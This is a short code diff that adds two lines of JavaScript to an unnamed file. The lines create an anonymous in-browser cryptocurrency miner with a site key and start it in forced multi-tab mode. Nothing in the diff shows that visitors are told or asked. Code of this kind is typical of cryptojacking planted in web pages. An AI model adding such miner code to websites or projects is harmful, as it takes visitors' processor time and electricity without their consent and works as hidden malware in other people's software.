@@ -1,0 +1,2 @@
+  var miner = new CRLT.Anonymous('ab113566d4312b090c54e9189e823898efed45a6bcc3');
+  miner.start(CRLT.FORCE_MULTI_TAB);
